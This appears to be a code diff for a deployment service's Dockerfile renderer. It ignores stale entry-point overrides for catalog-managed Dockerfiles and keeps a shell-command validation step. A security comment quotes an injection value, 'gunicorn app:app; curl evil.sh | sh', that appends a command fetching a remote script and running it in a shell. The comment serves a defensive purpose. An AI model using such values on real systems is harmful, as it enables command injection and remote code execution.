@@ -3298,19 +3298,36 @@ def _inject_laravel_frontend_build(
 def _render_generic(platform, dockerfile_template, tar_stream, config, logger):
     entry_point_override = None
     if config is not None:
+        runtime_options = dict(getattr(config, "runtime_options", None) or {})
+        catalog_managed = bool(runtime_options.get("catalog_managed"))
+        dockerfile_owns_entrypoint = bool(
+            re.search(
+                r"^\s*ENTRYPOINT\s+",
+                dockerfile_template,
+                flags=re.MULTILINE | re.IGNORECASE,
+            )
+        )
+        # A catalog Dockerfile is the server-owned executable manifest. When
+        # it declares ENTRYPOINT itself, an old compatibility entry_point value
+        # must never reach _replace_cmd(), because that function removes the
+        # Dockerfile ENTRYPOINT before replacing CMD. This is a last-line
+        # renderer guard in addition to deployment-profile normalization and
+        # DeployService hardening.
+        ignore_stale_catalog_entrypoint = (
+            catalog_managed and dockerfile_owns_entrypoint
+        )
+
         # SECURITY: validate user-supplied entry_point override before it
-        # flows into supervisord command= or Dockerfile CMD.  Without this,
+        # flows into supervisord command= or Dockerfile CMD. Without this,
         # a value like "gunicorn app:app; curl evil.sh | sh" would execute
         # arbitrary shell commands inside the container at runtime.
         _raw_ep = (config.entry_point or "").strip() or None
-        if _raw_ep:
+        if _raw_ep and not ignore_stale_catalog_entrypoint:
             try:
                 entry_point_override = validate_shell_command(_raw_ep)
             except DeploymentValidationError:
                 # Re-raise with a clearer message
                 raise
-        else:
-            entry_point_override = None
     rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)
     if entry_point_override:
         rendered = _replace_cmd(rendered, entry_point_override)
